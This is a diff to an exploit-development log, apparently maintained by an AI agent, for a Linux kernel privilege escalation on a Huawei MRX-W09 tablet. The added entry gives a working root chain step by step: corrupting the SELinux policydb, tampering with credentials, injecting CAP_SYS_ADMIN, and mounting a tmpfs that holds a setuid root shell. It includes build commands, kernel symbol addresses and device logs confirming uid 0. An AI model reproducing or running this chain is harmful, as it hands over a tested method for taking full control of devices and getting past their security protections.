@@ -3,7 +3,7 @@
 Device: **Huawei MRX-W09** (Kirin 990, arm64, Linux **4.14.116**, EMUI 11.0.0.235,
 SELinux enforcing, `LTO_CLANG=y` + `CFI_CLANG=y`, `CONFIG_DEBUG_SPINLOCK=y`,
 `CONFIG_PREEMPT=y`, 39-bit VA, ticket spinlocks, **HKIP/HHEE active**).
-Reference kernel image: `[FIRMWARE]\MRX-W09\extracted\vmlinux.elf`
+Reference kernel image: `F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf`
 (symbol list: `nm_vmlinux.txt`). All addresses below are **link-time**; add the
 KASLR slide at runtime.
 
@@ -1361,7 +1361,7 @@ Also in this change: `w[1]=0` / `w[2]=target` (upstream single-left-child shape)
 
 ## 9ag. EXACT guard semantics + the shallow half of the MCAST window does not survive
 
-Disassembled on our own vmlinux (`[FIRMWARE]\MRX-W09\extracted\vmlinux.elf`,
+Disassembled on our own vmlinux (`F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf`,
 rt_mutex_adjust_prio_chain = 0xffffff800822ea28).  The branch to the BUG at +0xaf0 comes from
 **+0x294**, and the guard is literally:
 
@@ -1858,7 +1858,7 @@ Key facts:
 * **MRX-W09 has NO `selinux_state` and NO `selinux_enforcing`** (`# CONFIG_SECURITY_SELINUX_DEVELOP
   is not set` => `#define selinux_enforcing 1`); `ss_initialized` (0xffffff800adc00a0) is
   `.data..prmem_wr` (RO + HHEE ROWM) => a zero write there faults. So the "zero the enforcing byte"
-  route is DEAD. (Verified against the Huawei source in `[WORKSPACE]\huawei_kernel_src`.)
+  route is DEAD. (Verified against the Huawei source in `F:\testtest\testenv\huawei_kernel_src`.)
 * **HKIP source-verified**: `hkip_get_task_bit(bits,task,true)` returns `true` when
   `task_pid_nr(task)==0` (== `task->pid`); `hkip_set_task_bit` skips pid==0 => a pid-0 task is
   HKIP-ALLOWed but can never hold its own bit. BUT `kernel/exit.c:786` panics
@@ -3636,7 +3636,7 @@ any=ffffffd7ef868000)` - nin=29 means 29 samples DID land in [setp+0x3c, setp+0x
 technique reaches the window; but the returned window x25 (published C = ffffffd85e519600) is NOT
 the cred (MAIN zeroed C+4/+0x14/+0x1C and the child setresuid still reported uid=2000, and no panic,
 so it wrote somewhere benign).  Likely causes: the setp base (0xffffff800818e354) is from
-[FIRMWARE]\MRX-W09\extracted\vmlinux.elf which may differ from the device kernel, OR the
+F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf which may differ from the device kernel, OR the
 register index/order is off (x25 vs x21 vs x20), OR the window x25 is not the cred there.  NEXT:
 dump x20/x21/x25 in the window (and the ip) to identify the cred register, and verify the
 SyS_setpriority.cfi address against the device (kptr_restrict is 0 -> /proc/kallsyms readable).
@@ -3688,7 +3688,7 @@ The read oracle should be made non-destructive or replaced (a plain open of /dev
 
 ### (122) 2026-09-26 GROUND TRUTH: symbols from the device's own vmlinux.elf + the setresuid gates
 
-SYMBOLS (host-side, from [FIRMWARE]\MRX-W09\extracted\vmlinux.elf; full table in
+SYMBOLS (host-side, from F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf; full table in
 ghostlock_pocs/MRX_SYMBOLS_20260926.md): init_task=0xffffff800adeb4c0, init_cred=0xffffff800adfcd28,
 commit_creds=0xffffff8009e6212c, security_capable=0xffffff8009e621c4, cap_capable=0xffffff8009e62278,
 policydb=0xffffff800b3b97c0, ashmem_misc=0xffffff800b118898 (fops=+0x10=0xffffff800b1188a8 - so the
@@ -4272,7 +4272,7 @@ DEVICE RUNS (one per reboot):
   __NR_select (asm-generic 1067, inside __ARCH_WANT_SYSCALL_DEPRECATED) is NOT wired.
   => there is NO select(2) fd_set carrier on arm64; pselect6 is the only one.
 
-DEVICE-IMAGE DISASM ([FIRMWARE]\MRX-W09\extracted\vmlinux.elf, link addrs):
+DEVICE-IMAGE DISASM (F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf, link addrs):
 - `SyS_pselect6.cfi` @0xffffff800846d774: `sub sp,sp,#0xa0`; bl core_sys_select.cfi.
 - `core_sys_select.cfi` @0xffffff800846c798: `sub sp,sp,#0x1c0`; at +0xd0 `add x19,sp,#0x50`
   => the three fd_sets (bits) start at  A0 = E-0x210  (E = task_stack+THREAD_SIZE-0x140),
@@ -4315,7 +4315,7 @@ REMAINING PATH (not yet implemented/tested):
 ### (150) 2026-09-26 AGENT: *** HYBRID WINDOW FREEZE WORKS - shell type PERMISSIVE (route B) ***
 
 Implemented `--freeze` in ghostlock_mrx_e.c (ONLY that file).  Build:
-  [WORKSPACE]\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
+  F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
     -O2 -static -pthread -o ghostlock_e_freeze11 ghostlock_mrx_e.c
   source sha256 903678B4D7773D0908EC87C675EB347D10FE25E55B123EFDC92D6FEF84BBF2CD
   binary sha256 553EC3206973D3663D1C910DD7427C416D53AF8343CDFC4AC49AC8B0F99F3A47
@@ -4405,3 +4405,104 @@ NEXT (follow-on, not part of this mode): the mount errno dropped 13 -> 1, so com
   --freeze with the already-verified CAP_SYS_ADMIN cap_effective injection (FACTS
   9an(142)/(145)) should let a direct mount(2) create a non-nosuid tmpfs; a 4755 root
   shell still needs uid 0, i.e. the --simple cred-identity endgame.
+
+
+### (151) 2026-09-26 AGENT: *** COMPLETE ROOT: `--root` mounts a NON-nosuid tmpfs and a 4755 root-owned shell executes as uid 0 ***
+
+Implemented `--root` in ghostlock_mrx_e.c (ONLY that file) - ONE mode that chains
+the three verified pieces and adds the direct `mount(2)` endgame.
+Build: F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
+  -O2 -static -pthread -o ghostlock_e_root ghostlock_mrx_e.c
+  source sha256 A2DEE6124493311291964072002AB6EBBB322456B1F62F130D87E701831B00FF
+  binary sha256 E503880105F295BCEEEB89C96F1A124D12CEEB080FCCABFD3C67AC39783BAFA2
+  (pushed to /data/local/tmp/ghostlock_e, sha256 matches on device; enabler runbook
+  ran after a clean reboot, perf_event_paranoid read -1).
+`--simple`/`--cede`/`--full`/`--freeze` are UNCHANGED: every new statement is
+gated on argv[1]=="--root" (or is a new helper only called from it).
+
+WHAT `--root` DOES (in order)
+  1. `--freeze` machinery: MCAST-plant the resident fake ebitmap node on a y thread
+     parked in a blocking pselect6, then two pointer writes: policydb+0x1C8
+     (highbit) and policydb+0x1C0 (.node).  sel_access_flags() shows the `shell`
+     type permissive (avd.flags bit0 = 1).
+  2. root_cap_value(): park y-windows until one's node address (W+0x50) has
+     CAP_SYS_ADMIN (bit21) in its low32.  Because each parked thread HOLDS its
+     kernel stack, the next park yields a DIFFERENT W, so this samples the bit21
+     coin flip until it wins (~1/2 per park, 12 tries).  Run BEFORE the fork so the
+     child is not delayed.  The node's first word is odd (n[0]=node|1) so the
+     rb_is_black gate *(value)&1 holds, and the primitive's side store lands at
+     node+8 (that window's maps[1], unused) - it does NOT touch maps[5], which is
+     what covers the shell type in the permissive node.
+  3. `--simple` endgame: fork the uid-2000 child, leak its cred C, pid-0 shield its
+     task (task->pid @0x820), zero C+4 (uid+gid), child setresuid(0,0,0).
+     CRITICAL KERNEL PATCH (Huawei 4.14): setresuid sets fsuid=euid (kernel/sys.c:671)
+     so setfsuid(0) is unnecessary, and setresgid MUST NOT be called because it sets
+     fsgid=egid (kernel/sys.c:753) - doing so makes /data/local/tmp (mode 0771, group
+     shell) unwritable and BREAKS rooted.txt/rsh.  With no setresgid the child keeps
+     fsgid=2000 and both deliverables are produced (owner root, group shell).
+  4. `--full` cap injection: the child re-leaks its final post-commit cred C2; MAIN
+     writes the bit21 value into C2+0x38 (cap_effective) and C2+0x30 (cap_permitted).
+  5. The child (task->pid==0, uid 0, shell domain, CAP_SYS_ADMIN, NO exec/fork before
+     the mount) calls mount(2) DIRECTLY, trying /data/local/tmp/glrt, /mnt, /dev;
+     on success it drops a root-owned 4755 copy of /system/bin/sh.
+
+GOTCHA FOUND AND FIXED (why the first --root run's report/proof files were 0 bytes)
+  avc_miss_gen() calls keyctl(KEYCTL_JOIN_SESSION_KEYRING,...).  That changes the
+  process session keyring, and /data is fscrypt-protected, so every later
+  open/write of a shell_data_file FAILS with ENOKEY ("Required key not available").
+  Symptom: realroot.txt / root_mount.txt were created (correct owner) but always
+  0 bytes, write_proof() never recreated rooted.txt/rsh, and the su grandchild got
+  "can't create ...: Permission denied / Required key not available".
+  FIX: new g_nokeyring flag (set ONLY by --root) skips that one keyctl call; the
+  remaining AVC churn is unchanged and --freeze is untouched.
+  Second bug fixed: g_root_path was set to the mount DIR; it now holds the SHELL
+  path (<mdir>/glsh), which the in-exploit uid-2000 setuid proof execs.
+
+DEVICE EVIDENCE (run 4, raw; /data/local/tmp/gl.klog + realroot.txt)
+  [child, cap injection]
+  root: OWN CapEff=ffffffc1d8b6fd40 prm=ffffffc1d8b6fd40 bnd=0000000000000000
+        (low32 0xb6fd40 has bit21 set = CAP_SYS_ADMIN)
+  [child, mount]
+  root: mount(tmpfs,'/data/local/tmp/glrt',0,NULL) rc=-1 errno=13
+  root: mount(tmpfs,'/mnt',0,NULL) rc=0 errno=0
+  [child, 4755 shell]
+  root: glsh '/mnt/glsh' chown=-1/1 chmod=0/0 stat=0 uid=0 gid=2000 mode=104755 size=303720
+  root: grandchild exec status=0
+    --- 4755 shell exec (from uid-0 child) ---
+    uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
+  [MAIN, the decisive setuid proof: a uid-2000 fork execs the 4755 shell]
+  root: setuid proof path=/mnt/glsh glsh_ok=1
+  root: setuid proof child status=0
+    --- uid-2000 exec of 4755 glsh ---
+    uid=0(root) gid=2000(shell) euid=0(root) groups=2000(shell),1004(input),1007(log),
+      1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
+      3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
+    0
+    u:r:shell:s0
+  [/proc/self/mountinfo]  1896 42 0:44 / /mnt rw,relatime shared:47 - tmpfs tmpfs rw,seclabel,gid=2000
+        (the pre-existing /mnt is 42 ... rw,nosuid,nodev,noexec; the NEW stack top is 1896, NOT nosuid/noexec)
+  [/proc/mounts]  tmpfs /mnt tmpfs rw,seclabel,relatime,gid=2000 0 0
+  [stat /mnt/glsh]  Access: (04755/-rwsr-xr-x)  Uid: (0/root)  Gid: (2000/shell)
+  [ls -l /data/local/tmp]  -rw-r--r-- 1 root shell 67 rooted.txt
+                           -rwsr-xr-x 1 root shell 303720 rsh
+  [rooted.txt]  === GHOSTLOCK MRX-W09 rooted === / uid=0 euid=0 context=u:r:shell:s0
+  [su -c id]    uid=0(root) gid=0(root) groups=0(root),... context=u:r:shell:s0
+  => a DIRECT mount(2) from the capped uid-0 child created a NON-nosuid tmpfs, a
+     root-owned 4755 /system/bin/sh copy on it executes with euid 0 for a
+     NON-root (uid 2000) caller, and the existing uid-0 proof files + rsh + su
+     server still work.  COMPLETE ROOT.
+
+NOTES / residual observations (not blockers)
+  - /data/local/tmp/glrt returned EACCES (errno 13) - a cached mounton AVC from the
+    pre-patch epoch; the child then fell through to /mnt exactly as the task
+    instructed.  A future run could avc_miss_gen-sweep keyed to that mountpoint.
+  - The "root: MOUNTS '...'" report line matched the OLD /mnt line (strstr), so it
+    wrongly printed nosuid=1; /proc/self/mountinfo above is the authoritative record
+    of the new mount (id 1896, no nosuid/noexec).
+  - mksh (the /system/bin/sh copy) calls setgid(getgid()) at startup and the Android
+    setresgid patch then sets fsgid=egid=0, so a setuid shell drops euid unless
+    invoked with -p; that is why the setuid proofs use `sh -p -c`.  The child's own
+    `id` therefore shows gid 0 while the uid-2000 exec of glsh shows gid 2000.
+  - Only /data/local/tmp/glrt was attempted before /mnt; /dev and /data/local/tmp
+    were not reached (success broke the loop).  The target list is in the code.
+
